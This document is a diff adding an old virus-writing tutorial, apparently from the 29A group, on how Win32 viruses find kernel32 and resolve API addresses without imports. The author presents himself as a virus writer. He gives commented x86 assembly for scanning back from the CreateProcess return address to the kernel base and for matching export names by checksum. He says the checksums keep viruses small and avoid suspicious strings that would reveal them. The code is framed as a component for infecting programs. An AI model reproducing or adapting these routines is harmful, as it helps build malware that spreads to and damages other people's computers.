@@ -1,0 +1,216 @@
+
+                            .   .       .  .    .
+                           .:: .:.. .. .:.::. :.:.
+                       <<-=млллллм.млллллм.млллллм==<
+                         .:ллл ллл:ллл ллл.ллл ллл::.
+                        :: .мммллп.плллллл:ллллллл .:.
+                       .:..лллмммм.ммммллл.ллл ллл.::.:
+                     .:>===ллллллл:ллллллп.ллл ллл==->> .
+                   ..: ::. . .:..Laboratories .:.. :.. ::..
+
+
+                           RETRIEVING API'S ADRESSES
+                             ФФФФФФФФФФФФФФФФФФФФФ
+
+    A guide to the latest methods to retrieve API's in a Win32 environment
+
+                               By LethalMind/29A
+
+                        E-Mail : LethalMind@hushmail.com
+
+
+    л Introduction
+
+
+    When I began working on Win32 viruses, it was not as easy at it is now.
+Lots of documentation was not here, and only a few people could answer your
+questions. One of the first things I looked for, being already at ease with C
+and some other high level languages, was how to use the API in a virus. And
+the first thing to do is find the addresses of these API. When I wrote my first
+W32 virus, Champagne, the only methods I knew were bad ones, like hardcoded
+addresses, or such incompatibles and unsafe methods... Now, building my second
+W32 virus, I think I've gotten to what I consider the "best" method out there.
+Some people may not like it, find it unsafe, etc... But I thought it would
+be great for me to share what *I* think is the best one with others. Also,
+this is my very first tutorial, so please be kind with me, and mail me any
+comment you might have to LethalMind@hushmail.com.
+    Now let's start the fun!
+
+
+
+
+    л What methods are you using in two words?
+
+
+    Ok, retrieving the APIs involve two steps. One is to retrieve the address
+of the Kernel in memory, and the second step is to scan its export table to
+know where these API exactly are. Once you've done that, you're ready to
+play with whichever API you might want :)
+
+
+
+
+    л Tell me how to get Kernel!
+
+
+    First, a bit of theory:
+    When the infected proggie is run, it gets called by CreateProcess. What
+does that means ?? That means that the stack has the return address in it. So
+only thing you got to do is to scan back in memory from that address (which we
+know to be inside the Kernel) until you're at the beginning of it. It's really
+easy, and yet a very powerful method, since it's short, compatible (I don't
+see HOW it could not be compatible :) and fast. And I also may say neat :)
+Now some code to illustrate this neat trick:
+
+8<------------------------------ S N I P E T ---------------------------------
+
+KernelAdress dd ?
+
+StartOfYourVirus:
+      mov      ecx,[esp]                ; Return adress of call from
+                                        ; CreateProcess
+GetKrnlBaseLoop:                        ; Get Kernel32 module base adress
+      xor      edx,edx                  ;
+      dec      ecx                      ; Scan backward
+      mov      dx,[ecx+03ch]            ; Take beginning of PE header
+      test     dx,0f800h                ; Is it a PE header ?
+      jnz      GetKrnlBaseLoop          ; No, forget about it
+      cmp      ecx,[ecx+edx+34h]        ; Compare current adress with the
+                                        ; address that PE should be loaded at
+      jnz      GetKrnlBaseLoop          ; Different ? Search again
+      mov      [KernelAdress+ebp],ecx   ; ecx hold KernelBase... Store it
+
+8<---------------------------E N D - S N I P E T -----------------------------
+
+
+
+
+
+    л Now let's deal with export table
+
+
+    I won't teach you here the structure of the export table. That can be
+found in almost every zine today. But I'll show you how I use it to get API by
+checksum. What is a checksum? A checksum is a number computed from a bigger
+one that identifies it, some kind of fingerprint. For example, let's take 1234
+We could generate a checksum by adding all his numbers between them. So the
+checksum for 1234 would be 1+2+3+4 = 10. Now, if we see 1234, and we have its
+checksum, we can say that both match. But if it were 1235, 1+2+3+5= 11 and the
+checksum would not match. The checksum gives us a way to identify something
+without knowing it all. That is VERY useful, because to get API, we'd need to
+store those looonnnng names, and that would grow our viruses, and these
+strings are suspicious too. I've chosen a 32-bit checksum because it's more
+secure and doesn't take that much space, but I could have chosen a bigger or
+smaller one, the bigger it is, the least chance you have to mis-identify an
+API's name. Now, I think a snippet of code will be much more useful than a lot
+of talking. This routine is POOOOORLY optimized, but I think it's far more
+well commented than well optimized, and, hey, that's what matter in a tute :)
+
+8<------------------------------ S N I P E T ---------------------------------
+
+
+      mov      eax,ecx                        ; EAX = KernelBase
+      mov      ebx,eax                        ; EBX = KernelBase
+      add      eax,[eax.MZ_lfanew]            ; Get address of PE header
+      mov      esi,ebx                        ; Get address of Export
+                                              ; directory
+      add      esi,[eax.NT_OptionalHeader             \
+                                .OH_DirectoryEntries  \
+                                .DE_Export            \
+                                .DD_VirtualAddress]
+      mov      edx,ebx                         ; Get address of exported
+      add      edx,[esi.ED_AddressOfNames]     ; API names
+      mov      ecx,[esi.ED_NumberOfNames]      ; Get number of exported
+      xor      eax,eax                         ; API names
+      lea      edi,WORD PTR [ebp+BeginAPIList] ; Point to beginning of list
+
+      mov      [SESI+ebp],esi                  ; Save some regs
+      mov      [SEAX+ebp],eax                  ;
+      mov      [SECX+ebp],ecx                  ;
+      mov      [SEBX+ebp],ebx                  ;
+      mov      [SEDX+ebp],edx                  ;
+
+Search_for_API_name:
+      mov      esi,ebx                         ; Get address of next exported
+      add      esi,[edx+eax*4]                 ; API name
+
+Next_API_name:
+      pusha
+      xor      edx,edx
+      mov      edx,DWORD PTR[edi]     ; Take the checksum
+      add      edi,4                  ; Point To Next
+      test     edx,edx                ; Is this checksum 0 ?
+      jz       EndAPIRetrieving       ; Yeah, we're done with them
+LoopChsksm:
+      xor      eax,eax
+      lodsb                           ; Take a char (ie : "X")
+      shl      ax,8                   ; move it left (ie : "X_")
+      sub      edx,eax                ; Substract that from checksum
+      cmp      ax,0                   ; Is the char 0 ?
+      jz       LoopConti              ; Yes, check if checksum too
+      xor      ax,ax                  ;
+      lodsb                           ; Load another char (ie : "Y")
+      sub      edx,eax                ; Substract that from checksum
+      cmp      ax,0                   ; Is the char 0 ?
+      jnz      LoopChsksm             ; No, Continue looping
+LoopConti:
+      test     edx,edx                ; Have we zeroed our checksum ?
+      jz       FoundAPI               ; YES, we have found the right API
+      popa                            ;
+      inc      eax                    ; Nope, next name....
+      loop     Search_for_API_name
+FoundAPI:
+      popa
+      mov      esi,[SESI+ebp]
+      mov      edx,ebx                ; Get address of exp. API ordinal
+      add      edx,[esi.ED_AddressOfOrdinals]
+      movzx    eax,word ptr [edx+eax*2]  ; Get index into exp.API functions
+
+Check_Index:
+      mov      edx,ebx                ; Get address of exported API function
+      add      edx,[esi.ED_AddressOfFunctions]
+      add      ebx,[edx+eax*4]        ; Get address of requested API function
+      mov      eax,ebx                ;
+
+End_GetProcAddressET:
+      add      edi,4
+      stosd                           ; Save API's adress into our array
+      mov      eax,[SEAX+ebp]         ; Restore some regs
+      mov      ebx,[SEBX+ebp]         ;
+      mov      ecx,[SECX+ebp]         ;
+      mov      edx,[SEDX+ebp]         ;
+      jmp      Search_for_API_name    ; Next Name
+
+
+SESI      dd      0
+SEAX      dd      0
+SECX      dd      0
+SEBX      dd      0
+SEDX      dd      0
+
+BeginAPIList:
+
+sCloseHandle            dd    'Cl'+'os'+'eH'+'an'+'dl'+'e'*100h
+aCloseHandle            dd    0
+sCreateFileA            dd    'Cr'+'ea'+'te'+'Fi'+'le'+'A'*100h
+aCreateFileA            dd    0
+sCreateFileMappingA     dd    'Cr'+'ea'+'te'+'Fi'+'le'+'Ma'+'pp'+'in'+'gA'
+aCreateFileMappingA     dd    0
+                        dd    0
+
+
+8<---------------------------E N D - S N I P E T -----------------------------
+
+
+
+
+    л Conclusion
+
+
+    So this method is pretty easy to understand once you've understood export
+table's structure. It use NO bug or anything like this so it is very
+compatible. To me, it's the neatest way of retrieving API's address, but if
+anyone think he has a better method, don't say my tutorial sucks, mail me and
+tell me about it so I may perhaps learn something :)
+
+
